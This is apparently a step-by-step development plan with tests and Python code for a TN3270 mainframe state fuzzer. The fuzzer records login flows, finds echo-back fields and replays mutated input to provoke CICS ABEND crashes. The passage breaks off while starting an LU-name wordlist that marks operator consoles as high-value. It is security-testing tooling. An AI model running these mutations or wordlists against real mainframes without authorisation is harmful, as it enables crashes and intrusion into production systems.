The hardest attack — split into 3 tasks (6, 7, 8). Task 6 is **record only**: capture host-screen + user-input pairs as `Step` objects in a `Flow`. Spec §3.5 Phase 1.

- [ ] **Step 1: Write failing tests for recording**

Create `tests/test_state_fuzz.py`:

```python
"""
Pseudo-conversational state fuzzer tests.

Three phases:
  Task 6 — Record: observer captures (host_screen, user_input) pairs as Steps
  Task 7 — Analyze: find echo-back fields (step N input → step N+1 output)
  Task 8 — Mutate-replay: drive flow to target step, mutate, classify result
"""
import pytest
import sqlite3
from hackterm_core.ebcdic import EbcdicCodec

_codec = EbcdicCodec()


def _screen(text: str) -> bytes:
    """Build a minimal s2c datastream rendering `text`."""
    return bytes([0xF5, 0xC3, 0x1D, 0x40]) + _codec.to_ebcdic(text) + b"\xff\xef"


def _input(text: str) -> bytes:
    """Build a minimal c2s inbound packet (AID=ENTER + text)."""
    # AID + cursor + SBA + addr + EBCDIC text + IAC EOR
    return (b"\x7d\x40\x40\x11\x40\xc1"
            + _codec.to_ebcdic(text) + b"\xff\xef")


# ===========================================================================
# Task 6: Recording
# ===========================================================================

@pytest.fixture
def fuzzer(tmp_path):
    from hack3270_libs.attacks.state_fuzz import StateFuzzer
    from hack3270_libs.tn3270_v2 import TN3270
    db = sqlite3.connect(str(tmp_path / "fuzz.db"))
    return StateFuzzer(protocol=TN3270(), db=db)


def test_step_dataclass():
    from hack3270_libs.attacks.state_fuzz import Step
    from hackterm_core.protocol import Screen
    s = Step(host_screen=Screen.empty(), user_input=b"\x7d", timestamp=0.0)
    assert s.user_input == b"\x7d"


def test_flow_dataclass():
    from hack3270_libs.attacks.state_fuzz import Flow
    f = Flow(id=0, name="login", steps=[])
    assert f.name == "login"
    assert f.steps == []


def test_recorder_starts_not_recording(fuzzer):
    assert fuzzer.recording is False


def test_start_recording(fuzzer, fake_daemon):
    fuzzer.attach(fake_daemon)
    fuzzer.start_recording("login_flow")
    assert fuzzer.recording is True
    assert fuzzer.current_flow.name == "login_flow"


def test_record_s2c_creates_step(fuzzer, fake_daemon):
    """Each s2c packet → parse() → store as new Step.host_screen."""
    fuzzer.attach(fake_daemon)
    fuzzer.start_recording("test")
    fake_daemon.fire_s2c(_screen("ENTER USERID"))
    assert len(fuzzer.current_flow.steps) == 1
    assert "ENTER USERID" in fuzzer.current_flow.steps[0].host_screen.text


def test_record_c2s_attaches_to_previous_step(fuzzer, fake_daemon):
    """Each c2s packet → store as user_input on the PREVIOUS step.
    The pairing is: host shows screen, THEN user responds. So the
    response goes on the step that holds the screen the user saw."""
    fuzzer.attach(fake_daemon)
    fuzzer.start_recording("test")
    fake_daemon.fire_s2c(_screen("ENTER USERID"))
    fake_daemon.fire_c2s(_input("BOB"))
    assert len(fuzzer.current_flow.steps) == 1
    assert fuzzer.current_flow.steps[0].user_input == _input("BOB")


def test_record_full_flow(fuzzer, fake_daemon):
    """Multi-step: screen → input → screen → input → screen."""
    fuzzer.attach(fake_daemon)
    fuzzer.start_recording("login")
    fake_daemon.fire_s2c(_screen("USERID:"))
    fake_daemon.fire_c2s(_input("BOB"))
    fake_daemon.fire_s2c(_screen("PASSWORD:"))
    fake_daemon.fire_c2s(_input("SECRET"))
    fake_daemon.fire_s2c(_screen("WELCOME BOB"))

    flow = fuzzer.current_flow
    assert len(flow.steps) == 3
    assert "USERID" in flow.steps[0].host_screen.text
    assert flow.steps[0].user_input == _input("BOB")
    assert "PASSWORD" in flow.steps[1].host_screen.text
    assert flow.steps[1].user_input == _input("SECRET")
    assert "WELCOME BOB" in flow.steps[2].host_screen.text
    assert flow.steps[2].user_input == b""  # no input yet


def test_record_ignores_when_not_recording(fuzzer, fake_daemon):
    fuzzer.attach(fake_daemon)
    fake_daemon.fire_s2c(_screen("hello"))
    assert fuzzer.current_flow is None


def test_stop_recording_persists_to_db(fuzzer, fake_daemon):
    """stop_recording() writes Flow + Steps to SQLite, returns flow_id."""
    fuzzer.attach(fake_daemon)
    fuzzer.start_recording("login")
    fake_daemon.fire_s2c(_screen("USERID:"))
    fake_daemon.fire_c2s(_input("BOB"))

    flow_id = fuzzer.stop_recording()
    assert flow_id > 0
    assert fuzzer.recording is False

    # Verify it's in the DB
    cur = fuzzer.db.cursor()
    cur.execute("SELECT name FROM Flows WHERE id = ?", (flow_id,))
    assert cur.fetchone()[0] == "login"
    cur.execute("SELECT COUNT(*) FROM Steps WHERE flow_id = ?", (flow_id,))
    assert cur.fetchone()[0] == 1


def test_load_flow_from_db(fuzzer, fake_daemon):
    """Round-trip: record → stop → load."""
    fuzzer.attach(fake_daemon)
    fuzzer.start_recording("login")
    fake_daemon.fire_s2c(_screen("USERID:"))
    fake_daemon.fire_c2s(_input("BOB"))
    fake_daemon.fire_s2c(_screen("WELCOME"))
    flow_id = fuzzer.stop_recording()

    loaded = fuzzer.load_flow(flow_id)
    assert loaded.name == "login"
    assert len(loaded.steps) == 2
    assert "USERID" in loaded.steps[0].host_screen.text
    assert loaded.steps[0].user_input == _input("BOB")
```

- [ ] **Step 2: Run, verify failure**

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/pytest tests/test_state_fuzz.py -v
```

Expected: `ModuleNotFoundError`.

- [ ] **Step 3: Implement Step/Flow + recording**

Create `hack3270_libs/attacks/state_fuzz.py`:

```python
"""
Pseudo-conversational state fuzzer.

The hardest attack. Three phases (spec §3.5):

  RECORD (Task 6): observer captures (host_screen, user_input) pairs.
    Each s2c → parse → new Step.host_screen.
    Each c2s → goes on PREVIOUS step's user_input (the response to
    that screen).

  ANALYZE (Task 7): find echo-back fields. If step N's screen contains
    text that appeared in step M's input (M < N), that field echoes
    user input — a fuzzing target.

  MUTATE-REPLAY (Task 8): drive a fresh session through the flow up to
    a target step, send mutated input, classify the result.

Reference: DEF CON 30 — Labelle, "Mainframe Buffer Overflows" — the
COMMAREA echo-back pattern this exploits.
"""
import time
import sqlite3
from dataclasses import dataclass, field
from typing import Optional, Literal

from hackterm_core.protocol import Protocol, Screen


# ===========================================================================
# Data model — spec §3.5
# ===========================================================================

@dataclass
class Step:
    """One round-trip: host shows a screen, user responds."""
    host_screen: Screen
    user_input: bytes = b""
    timestamp: float = 0.0


@dataclass
class Flow:
    """A recorded sequence of Steps. Persisted to SQLite."""
    id: int
    name: str
    steps: list[Step] = field(default_factory=list)


@dataclass
class EchoTarget:
    """A field in step N that echoes input from step M < N."""
    step_idx: int       # which step's screen has the echo
    field_idx: int      # index into steps[step_idx].host_screen.fields
    source_step: int    # which earlier step's input was echoed
    confidence: float   # match_len / field_len, 0.0–1.0


# ===========================================================================
# StateFuzzer
# ===========================================================================

class StateFuzzer:
    """Pseudo-conversational fuzzer: record → analyze → mutate-replay."""

    def __init__(self, protocol: Protocol, db: sqlite3.Connection):
        self.protocol = protocol
        self.db = db
        self.recording = False
        self.current_flow: Optional[Flow] = None
        self._init_schema()

    def _init_schema(self) -> None:
        """Create Flows + Steps tables. Idempotent."""
        cur = self.db.cursor()
        cur.execute("""
            CREATE TABLE IF NOT EXISTS Flows (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT NOT NULL,
                created REAL NOT NULL
            )
        """)
        cur.execute("""
            CREATE TABLE IF NOT EXISTS Steps (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                flow_id INTEGER NOT NULL,
                step_idx INTEGER NOT NULL,
                host_raw BLOB NOT NULL,
                user_input BLOB NOT NULL,
                timestamp REAL NOT NULL,
                FOREIGN KEY (flow_id) REFERENCES Flows(id)
            )
        """)
        self.db.commit()

    def attach(self, daemon) -> None:
        daemon.add_observer(self._observe)

    # --- Phase 1: Record (Task 6) ---------------------------------------

    def start_recording(self, name: str) -> None:
        self.current_flow = Flow(id=0, name=name, steps=[])
        self.recording = True

    def stop_recording(self) -> int:
        """Persist current_flow to SQLite. Returns the flow_id."""
        if not self.recording or self.current_flow is None:
            raise RuntimeError("not recording")
        self.recording = False

        cur = self.db.cursor()
        cur.execute("INSERT INTO Flows (name, created) VALUES (?, ?)",
                    (self.current_flow.name, time.time()))
        flow_id = cur.lastrowid

        for idx, step in enumerate(self.current_flow.steps):
            cur.execute(
                "INSERT INTO Steps (flow_id, step_idx, host_raw, user_input, timestamp) "
                "VALUES (?, ?, ?, ?, ?)",
                (flow_id, idx, step.host_screen.raw, step.user_input, step.timestamp)
            )
        self.db.commit()

        self.current_flow.id = flow_id
        return flow_id

    def load_flow(self, flow_id: int) -> Flow:
        """Reconstruct a Flow from SQLite. Re-parses host_raw → Screen."""
        cur = self.db.cursor()
        cur.execute("SELECT name FROM Flows WHERE id = ?", (flow_id,))
        row = cur.fetchone()
        if not row:
            raise KeyError(f"flow {flow_id} not found")
        flow = Flow(id=flow_id, name=row[0], steps=[])

        cur.execute(
            "SELECT host_raw, user_input, timestamp FROM Steps "
            "WHERE flow_id = ? ORDER BY step_idx",
            (flow_id,)
        )
        for host_raw, user_input, ts in cur.fetchall():
            screen = self.protocol.parse(bytes(host_raw))
            flow.steps.append(Step(host_screen=screen,
                                   user_input=bytes(user_input),
                                   timestamp=ts))
        return flow

    def _observe(self, data: bytes, direction: str) -> None:
        if not self.recording or self.current_flow is None:
            return

        if direction == "s2c":
            # Host sent a screen → new Step
            screen = self.protocol.parse(data)
            self.current_flow.steps.append(
                Step(host_screen=screen, user_input=b"", timestamp=time.time())
            )
        elif direction == "c2s":
            # User responded → attach to PREVIOUS step (the screen they
            # were responding to)
            if self.current_flow.steps:
                self.current_flow.steps[-1].user_input = data
```

- [ ] **Step 4: Run, verify pass**

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/pytest tests/test_state_fuzz.py -v
```

Expected: `11 passed`

- [ ] **Step 5: Commit**

```bash
git add hack3270_libs/attacks/state_fuzz.py tests/test_state_fuzz.py
git commit -m "feat(attacks): state fuzzer Phase 1 — Flow recording with SQLite persistence"
```

---

## Task 7: State fuzzer — echo-back analysis

**Files:**
- Modify: `hack3270_libs/attacks/state_fuzz.py`
- Modify: `tests/test_state_fuzz.py`

For each step N > 0, for each field F in that step's screen, check if F's content appears as a substring in any earlier step's user input. If yes → that's an echo-back target. O(steps² × fields) but flows are short. Spec §3.5 Phase 2.

- [ ] **Step 1: Write failing analyze tests**

Append to `tests/test_state_fuzz.py`:

```python
# ===========================================================================
# Task 7: Echo-back analysis
# ===========================================================================

def test_echotarget_dataclass():
    from hack3270_libs.attacks.state_fuzz import EchoTarget
    t = EchoTarget(step_idx=2, field_idx=0, source_step=0, confidence=1.0)
    assert t.confidence == 1.0


def test_analyze_finds_simple_echo(fuzzer, fake_daemon):
    """Step 0 input contains 'BOB'. Step 1 screen contains 'BOB'.
    → EchoTarget(step_idx=1, source_step=0)."""
    fuzzer.attach(fake_daemon)
    fuzzer.start_recording("echo_test")
    fake_daemon.fire_s2c(_screen("USERID:"))
    fake_daemon.fire_c2s(_input("BOBSMITH"))
    # The next screen echoes the input back
    fake_daemon.fire_s2c(_screen("WELCOME BOBSMITH"))
    flow_id = fuzzer.stop_recording()

    targets = fuzzer.analyze(flow_id)
    assert len(targets) >= 1
    t = targets[0]
    assert t.step_idx == 1       # echo appears in step 1
    assert t.source_step == 0    # input came from step 0


def test_analyze_no_echo_no_targets(fuzzer, fake_daemon):
    """No relationship between input and next screen → no targets."""
    fuzzer.attach(fake_daemon)
    fuzzer.start_recording("no_echo")
    fake_daemon.fire_s2c(_screen("USERID:"))
    fake_daemon.fire_c2s(_input("BOBSMITH"))
    fake_daemon.fire_s2c(_screen("ACCESS DENIED"))   # no echo
    flow_id = fuzzer.stop_recording()

    targets = fuzzer.analyze(flow_id)
    assert targets == []


def test_analyze_minimum_match_length(fuzzer, fake_daemon):
    """Matches shorter than 4 bytes are noise — ignored.
    'A' appearing in both screens shouldn't count."""
    fuzzer.attach(fake_daemon)
    fuzzer.start_recording("short")
    fake_daemon.fire_s2c(_screen("ENTER:"))
    fake_daemon.fire_c2s(_input("AB"))   # only 2 chars
    fake_daemon.fire_s2c(_screen("HELLO AB WORLD"))   # contains "AB" but too short
    flow_id = fuzzer.stop_recording()

    targets = fuzzer.analyze(flow_id)
    assert targets == []


def test_analyze_confidence_full_match(fuzzer, fake_daemon):
    """When field content == input text exactly, confidence = 1.0."""
    fuzzer.attach(fake_daemon)
    fuzzer.start_recording("conf")
    fake_daemon.fire_s2c(_screen("ENTER:"))
    fake_daemon.fire_c2s(_input("EXACTMATCH"))
    # Build a screen where one field's content is EXACTLY "EXACTMATCH"
    # SF + EBCDIC "EXACTMATCH" + SF (closes the field at exactly that length)
    pkt = (bytes([0xF5, 0xC3, 0x1D, 0x40])
           + _codec.to_ebcdic("EXACTMATCH")
           + bytes([0x1D, 0x60, 0xFF, 0xEF]))
    fake_daemon.fire_s2c(pkt)
    flow_id = fuzzer.stop_recording()

    targets = fuzzer.analyze(flow_id)
    assert len(targets) >= 1
    assert targets[0].confidence == 1.0


def test_analyze_confidence_partial_match(fuzzer, fake_daemon):
    """Field content partially matches input → confidence < 1.0."""
    fuzzer.attach(fake_daemon)
    fuzzer.start_recording("partial")
    fake_daemon.fire_s2c(_screen("ENTER:"))
    fake_daemon.fire_c2s(_input("ABCDEFGH"))
    # Field contains "ABCDE   " (5 of 8 chars match, padded to 8)
    pkt = (bytes([0xF5, 0xC3, 0x1D, 0x40])
           + _codec.to_ebcdic("ABCDE   ")
           + bytes([0x1D, 0x60, 0xFF, 0xEF]))
    fake_daemon.fire_s2c(pkt)
    flow_id = fuzzer.stop_recording()

    targets = fuzzer.analyze(flow_id)
    assert len(targets) >= 1
    # Field is 8 chars, 5 matched → confidence = 5/8
    assert 0.5 < targets[0].confidence < 1.0


def test_analyze_multi_step_echo(fuzzer, fake_daemon):
    """Echo can come from ANY earlier step, not just the immediately
    preceding one (e.g. login userid echoed on screen 5)."""
    fuzzer.attach(fake_daemon)
    fuzzer.start_recording("multi")
    fake_daemon.fire_s2c(_screen("USERID:"))
    fake_daemon.fire_c2s(_input("ALICE"))         # step 0
    fake_daemon.fire_s2c(_screen("PASSWORD:"))
    fake_daemon.fire_c2s(_input("SECRET"))        # step 1
    fake_daemon.fire_s2c(_screen("MENU"))
    fake_daemon.fire_c2s(_input("OPTION1"))       # step 2
    fake_daemon.fire_s2c(_screen("HELLO ALICE"))  # step 3 echoes step 0!
    flow_id = fuzzer.stop_recording()

    targets = fuzzer.analyze(flow_id)
    # Should find at least the ALICE echo at step 3 from source step 0
    alice_targets = [t for t in targets if t.step_idx == 3 and t.source_step == 0]
    assert len(alice_targets) >= 1


def test_analyze_field_idx_correct(fuzzer, fake_daemon):
    """When a screen has multiple fields, field_idx points to the right one."""
    fuzzer.attach(fake_daemon)
    fuzzer.start_recording("fieldidx")
    fake_daemon.fire_s2c(_screen("ENTER:"))
    fake_daemon.fire_c2s(_input("FINDME"))
    # Screen with 3 fields: "AAAA", "FINDME", "ZZZZ"
    pkt = (bytes([0xF5, 0xC3])
           + bytes([0x1D, 0x40]) + _codec.to_ebcdic("AAAA")
           + bytes([0x1D, 0x40]) + _codec.to_ebcdic("FINDME")
           + bytes([0x1D, 0x40]) + _codec.to_ebcdic("ZZZZ")
           + b"\xff\xef")
    fake_daemon.fire_s2c(pkt)
    flow_id = fuzzer.stop_recording()

    targets = fuzzer.analyze(flow_id)
    findme = [t for t in targets if t.confidence == 1.0]
    assert len(findme) == 1
    assert findme[0].field_idx == 1   # second field (0-indexed)
```

- [ ] **Step 2: Run, verify new tests fail**

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/pytest tests/test_state_fuzz.py -v -k analyze or echotarget
```

Expected: `EchoTarget` test passes (dataclass already exists), `analyze()` tests fail with `AttributeError`.

- [ ] **Step 3: Implement analyze()**

Append to `hack3270_libs/attacks/state_fuzz.py` (inside `StateFuzzer` class):

```python
    # --- Phase 2: Analyze (Task 7) --------------------------------------

    MIN_MATCH_LEN = 4   # ignore echoes shorter than this — too noisy

    def analyze(self, flow_id: int) -> list[EchoTarget]:
        """Find echo-back fields: places where step N's screen contains
        text that step M < N's input contained.

        O(steps² × fields) but flows are 5–15 steps so it's fine.

        Returns targets sorted by confidence descending.
        """
        flow = self.load_flow(flow_id)
        targets = []

        for n in range(1, len(flow.steps)):
            screen = flow.steps[n].host_screen
            for f_idx, field in enumerate(screen.fields):
                content = field.content
                if len(content) < self.MIN_MATCH_LEN:
                    continue
                # Strip trailing EBCDIC spaces (0x40) for comparison —
                # fields are usually space-padded
                stripped = content.rstrip(b"\x40")
                if len(stripped) < self.MIN_MATCH_LEN:
                    continue

                for m in range(n):
                    user_input = flow.steps[m].user_input
                    if not user_input:
                        continue
                    if stripped in user_input:
                        # Full match: field content (stripped) found in input
                        confidence = len(stripped) / len(content)
                        targets.append(EchoTarget(
                            step_idx=n, field_idx=f_idx,
                            source_step=m, confidence=confidence,
                        ))
                    else:
                        # Partial: longest prefix of `stripped` in input
                        match_len = self._longest_prefix_in(stripped, user_input)
                        if match_len >= self.MIN_MATCH_LEN:
```python
                        # Partial: longest prefix of `stripped` in input
                        match_len = self._longest_prefix_in(stripped, user_input)
                        if match_len >= self.MIN_MATCH_LEN:
                            confidence = match_len / len(content)
                            targets.append(EchoTarget(
                                step_idx=n, field_idx=f_idx,
                                source_step=m, confidence=confidence,
                            ))

        targets.sort(key=lambda t: t.confidence, reverse=True)
        return targets

    @staticmethod
    def _longest_prefix_in(needle: bytes, haystack: bytes) -> int:
        """Length of the longest prefix of `needle` that appears in `haystack`."""
        for length in range(len(needle), 0, -1):
            if needle[:length] in haystack:
                return length
        return 0
```

- [ ] **Step 4: Run, verify pass**

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/pytest tests/test_state_fuzz.py -v
```

Expected: `19 passed` (11 from Task 6 + 8 new)

- [ ] **Step 5: Commit**

```bash
git add hack3270_libs/attacks/state_fuzz.py tests/test_state_fuzz.py
git commit -m "feat(attacks): state fuzzer Phase 2 — echo-back field analysis"
```

---

## Task 8: State fuzzer — mutate-replay driver

**Files:**
- Modify: `hack3270_libs/attacks/state_fuzz.py`
- Modify: `tests/test_state_fuzz.py`

Phase 3: build a mutated input, drive a fresh session through the flow up to the target step, send the mutation, classify what happens. Spec §3.5 Phase 3.

The replay driver itself needs a live `daemon` with a connected host — not unit-testable in isolation. We test the **mutation builders** and **result classifier** in isolation; the replay loop gets one integration-style test using `FakeDaemon`'s `sent_to_server` log.

- [ ] **Step 1: Write failing mutation + classify tests**

Append to `tests/test_state_fuzz.py`:

```python
# ===========================================================================
# Task 8: Mutate-replay
# ===========================================================================

# --- Mutation builders ---

def test_mutation_length_plus_1(fuzzer):
    """Original field content + 1 byte. Tests EIBCALEN check."""
    original = _codec.to_ebcdic("ABCD")
    out = fuzzer.mutate_input(_input("ABCD"), original, "length_plus_1")
    # Output should contain original + 1 extra byte where the field data was
    # (we look for ABCD-in-EBCDIC followed by 5 chars instead of 4)
    assert len(out) == len(_input("ABCD")) + 1


def test_mutation_length_double(fuzzer):
    original = _codec.to_ebcdic("ABCD")
    out = fuzzer.mutate_input(_input("ABCD"), original, "length_double")
    # Output is 4 bytes longer (ABCD doubled = 8 bytes vs 4)
    assert len(out) == len(_input("ABCD")) + 4


def test_mutation_type_confusion_numeric_to_alpha(fuzzer):
    """If original is all EBCDIC digits (0xF0-0xF9), replace with alpha."""
    original = _codec.to_ebcdic("1234")   # F1 F2 F3 F4
    out = fuzzer.mutate_input(_input("1234"), original, "type_confusion")
    # Output should NOT contain the digit run, should contain alpha
    assert _codec.to_ebcdic("1234") not in out
    assert b"\xc1" in out  # at least one alpha byte


def test_mutation_type_confusion_alpha_unchanged(fuzzer):
    """If original isn't numeric, type_confusion is a no-op."""
    original = _codec.to_ebcdic("ABCD")
    out = fuzzer.mutate_input(_input("ABCD"), original, "type_confusion")
    assert out == _input("ABCD")


def test_mutation_extra_sba(fuzzer):
    """Append an SBA + addr + data triple the original screen didn't have.
    Tests whether host validates field positions."""
    original = _codec.to_ebcdic("ABCD")
    out = fuzzer.mutate_input(_input("ABCD"), original, "extra_sba")
    # Output is longer (has the extra SBA triple appended before IAC EOR)
    assert len(out) > len(_input("ABCD"))
    # Still ends with IAC EOR
    assert out.endswith(b"\xff\xef")
    # Contains an SBA byte (0x11) at a position the original didn't have
    assert out.count(b"\x11") > _input("ABCD").count(b"\x11")


def test_mutation_unknown_raises(fuzzer):
    with pytest.raises(ValueError):
        fuzzer.mutate_input(b"", b"", "not_a_real_mutation")


# --- Result classification ---

def test_classify_abend(fuzzer):
    """Screen containing ABEND/ASRA/AEY9 etc → ABEND result."""
    abend_screen = _screen("DFHAC2206 TRANSACTION ABEND ASRA")
    assert fuzzer.classify_result(abend_screen, _screen("normal")) == "ABEND"


def test_classify_disconnect(fuzzer):
    """Empty/None response → DISCONNECT."""
    assert fuzzer.classify_result(b"", _screen("normal")) == "DISCONNECT"
    assert fuzzer.classify_result(None, _screen("normal")) == "DISCONNECT"


def test_classify_identical(fuzzer):
    """Response matches expected → IDENTICAL (mutation had no effect)."""
    expected = _screen("WELCOME BOB")
    assert fuzzer.classify_result(expected, expected) == "IDENTICAL"


def test_classify_screen_differs(fuzzer):
    """Response is different but not ABEND → SCREEN_DIFFERS (interesting!)."""
    expected = _screen("WELCOME BOB")
    actual = _screen("ERROR INVALID INPUT")
    assert fuzzer.classify_result(actual, expected) == "SCREEN_DIFFERS"


def test_classify_fuzzy_identical(fuzzer):
    """Screens that differ ONLY in known-volatile positions (timestamps)
    are still IDENTICAL. Spec §7 risk: 'every replay diverges on
    timestamps' — fuzzy comparison mitigates."""
    # Two screens differing only in a small numeric region
    s1 = _screen("LOGGED IN AT 12:00:00 WELCOME")
    s2 = _screen("LOGGED IN AT 12:00:01 WELCOME")
    # Should be IDENTICAL — only 1 char differs in a 30-char screen
    assert fuzzer.classify_result(s1, s2) == "IDENTICAL"


# --- Replay driver (integration-ish, FakeDaemon) ---

def test_replay_sends_recorded_inputs(fuzzer, fake_daemon):
    """The replay driver sends each step's user_input verbatim up to
    the target step."""
    fuzzer.attach(fake_daemon)
    fuzzer.start_recording("test")
    fake_daemon.fire_s2c(_screen("STEP0"))
    fake_daemon.fire_c2s(_input("INPUT0"))
    fake_daemon.fire_s2c(_screen("STEP1"))
    fake_daemon.fire_c2s(_input("INPUT1"))
    fake_daemon.fire_s2c(_screen("STEP2"))
    flow_id = fuzzer.stop_recording()

    # Replay up to (but not including) step 2.
    # Should send step 0's input, then step 1's input.
    fuzzer._replay_to(fake_daemon, fuzzer.load_flow(flow_id), target_step=2)
    assert fake_daemon.sent_to_server == [_input("INPUT0"), _input("INPUT1")]


def test_step_swap_mutation(fuzzer, fake_daemon):
    """step_swap: replay step M's input at step N (state desync attack)."""
    fuzzer.attach(fake_daemon)
    fuzzer.start_recording("swap")
    fake_daemon.fire_s2c(_screen("STEP0"))
    fake_daemon.fire_c2s(_input("ZEROZERO"))
    fake_daemon.fire_s2c(_screen("STEP1"))
    fake_daemon.fire_c2s(_input("ONEONEONE"))
    fake_daemon.fire_s2c(_screen("STEP2"))
    flow_id = fuzzer.stop_recording()

    flow = fuzzer.load_flow(flow_id)
    # Swap: at step 1, send step 0's input instead
    swapped = fuzzer.build_step_swap(flow, target_step=1, source_step=0)
    assert swapped == _input("ZEROZERO")
```

- [ ] **Step 2: Run, verify failure**

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/pytest tests/test_state_fuzz.py -v -k "mutat or classify or replay or step_swap"
```

Expected: failures with `AttributeError: 'StateFuzzer' object has no attribute 'mutate_input'`.

- [ ] **Step 3: Implement mutations + classifier + replay**

Append to `hack3270_libs/attacks/state_fuzz.py` (inside `StateFuzzer` class):

```python
    # --- Phase 3: Mutate & Replay (Task 8) ------------------------------

    # Mutation table — spec §3.5
    MUTATIONS = ("length_plus_1", "length_double", "type_confusion",
                 "extra_sba", "step_swap")

    # ABEND signatures — CICS/IMS/TSO crash messages
    _ABEND_RE = __import__("re").compile(
        r"\b(ABEND|ASRA|AEY9|AICA|DFHAC22|DFHAC24|DSNT408I)\b"
    )

    # Classification: how much divergence still counts as "same screen"
    _FUZZY_THRESHOLD = 0.05   # ≤5% chars differ → IDENTICAL

    def mutate_input(self, packet: bytes, original_field: bytes,
                     mutation: str) -> bytes:
        """Build a mutated version of an inbound packet.

        `packet` is the recorded user_input bytes (full inbound packet).
        `original_field` is the EBCDIC content we're targeting inside it.
        We find that content in the packet and surgically replace it.

        Returns the mutated packet. Raises ValueError for unknown mutation.
        """
        if mutation == "length_plus_1":
            replacement = original_field + b"\xc1"   # append EBCDIC 'A'
        elif mutation == "length_double":
            replacement = original_field + original_field
        elif mutation == "type_confusion":
            # If all bytes are EBCDIC digits (0xF0-0xF9), replace with alpha
            if original_field and all(0xF0 <= b <= 0xF9 for b in original_field):
                replacement = bytes(0xC1 + (i % 9) for i in range(len(original_field)))
            else:
                return packet  # not numeric — no-op
        elif mutation == "extra_sba":
            # Append SBA + bogus addr + bogus data BEFORE the IAC EOR
            extra = bytes([0x11, 0x5D, 0x7F, 0xE7, 0xE7, 0xE7])  # SBA→addr 1919, "XXX"
            if packet.endswith(b"\xff\xef"):
                return packet[:-2] + extra + b"\xff\xef"
            return packet + extra
        elif mutation == "step_swap":
            raise ValueError("step_swap requires build_step_swap(), not mutate_input()")
        else:
            raise ValueError(f"unknown mutation: {mutation!r}")

        # Splice: find original_field in packet, replace with `replacement`
        idx = packet.find(original_field)
        if idx < 0:
            # Field content not found in packet — return unchanged
            # (can happen if field was space-padded differently)
            return packet
        return packet[:idx] + replacement + packet[idx + len(original_field):]

    def build_step_swap(self, flow: Flow, target_step: int,
                        source_step: int) -> bytes:
        """step_swap mutation: at target_step, send source_step's input
        instead. Tests state-desync (does the host validate sequence?)."""
        return flow.steps[source_step].user_input

    def classify_result(self, actual: Optional[bytes],
                        expected: bytes) -> str:
        """Classify the outcome of sending a mutated input.

        Categories (spec §3.5):
          DISCONNECT     — host dropped the connection (actual is None/empty)
          ABEND          — screen contains a known crash signature
          IDENTICAL      — screen matches expected (mutation had no effect)
          SCREEN_DIFFERS — something different — INTERESTING, investigate
        """
        if not actual:
            return "DISCONNECT"

        actual_screen = self.protocol.parse(actual)
        if self._ABEND_RE.search(actual_screen.text):
            return "ABEND"

        expected_screen = self.protocol.parse(expected)
        diff_ratio = self._screen_diff_ratio(actual_screen.text,
                                             expected_screen.text)
        if diff_ratio <= self._FUZZY_THRESHOLD:
            return "IDENTICAL"
        return "SCREEN_DIFFERS"

    @staticmethod
    def _screen_diff_ratio(a: str, b: str) -> float:
        """Fraction of character positions that differ. 0.0 = identical."""
        if not a and not b:
            return 0.0
        max_len = max(len(a), len(b))
        a = a.ljust(max_len)
        b = b.ljust(max_len)
        diffs = sum(1 for x, y in zip(a, b) if x != y)
        return diffs / max_len

    def _replay_to(self, daemon, flow: Flow, target_step: int) -> None:
        """Drive the daemon through the flow up to (but not including)
        target_step. Sends each step's recorded user_input verbatim.

        REAL replay needs to wait for each host response before sending
        the next input. With FakeDaemon there's no host, so this just
        sends in sequence — the live driver in the GUI/MCP wraps this
        with a wait-for-response loop using daemon.tick().
        """
        for i in range(target_step):
            inp = flow.steps[i].user_input
            if inp:
                daemon.inject_to_server(inp)

    def fuzz_target(self, daemon, flow_id: int, target: EchoTarget,
                    mutation: str) -> dict:
        """Full mutate-replay cycle. Returns result dict.

        Live-host only — needs a connected daemon. Unit tests cover
        the building blocks (mutate_input, classify_result, _replay_to)
        in isolation.

        Steps:
          1. (caller's responsibility: fresh session — daemon reconnect)
          2. Replay verbatim up to target.step_idx - 1
          3. At target step, send mutated input
          4. Capture response (caller pumps daemon.tick(), reads observer)
          5. Classify against recorded steps[target.step_idx + 1]
        """
        flow = self.load_flow(flow_id)

        # Replay verbatim
        self._replay_to(daemon, flow, target.source_step)

        # Build mutation
        original_step = flow.steps[target.source_step]
        echo_field = flow.steps[target.step_idx].host_screen.fields[target.field_idx]
        if mutation == "step_swap":
            mutated = self.build_step_swap(flow, target.source_step,
                                           source_step=max(0, target.source_step - 1))
        else:
            mutated = self.mutate_input(original_step.user_input,
                                        echo_field.content.rstrip(b"\x40"),
                                        mutation)

        daemon.inject_to_server(mutated)

        # Caller pumps tick() and observes response, then calls
        # classify_result(). We return a partial result here.
        return {
            "flow_id": flow_id,
            "target": target,
            "mutation": mutation,
            "mutated_packet": mutated,
            "expected": (flow.steps[target.step_idx].host_screen.raw
                         if target.step_idx < len(flow.steps) else b""),
        }
```

- [ ] **Step 4: Run, verify pass**

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/pytest tests/test_state_fuzz.py -v
```

Expected: `32 passed` (11 + 8 + 13)

- [ ] **Step 5: Commit**

```bash
git add hack3270_libs/attacks/state_fuzz.py tests/test_state_fuzz.py
git commit -m "feat(attacks): state fuzzer Phase 3 — mutations, classifier, replay driver"
```

---

## Task 9: lu-names.txt wordlist

**Files:**
- Create: `injections/lu-names.txt`

~500 seed entries. Pattern-generated. Spec §3.2 wordlist section.

- [ ] **Step 1: Generate wordlist**

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/python << 'EOF'
"""Generate injections/lu-names.txt — ~500 LU name candidates.

Patterns from real-world VTAM/CICS conventions:
  TCP00001-TCP00099  — TN3270 server default pool
  LU01-LU99          — generic VTAM LU pool
  TERM0001-TERM0050  — terminal pool
  CICSA01-CICSA20    — CICS region A terminals
  CICSP01-CICSP20    — CICS production
  CICST01-CICST20    — CICS test
  IMS01-IMS20        — IMS terminals
  TSO01-TSO20        — TSO terminals
  CONSOLE, MASTER, OPER01-OPER10  — operator consoles (high-value)
  PRT01-PRT10        — printer LUs (sometimes unauthenticated)
"""
lines = [
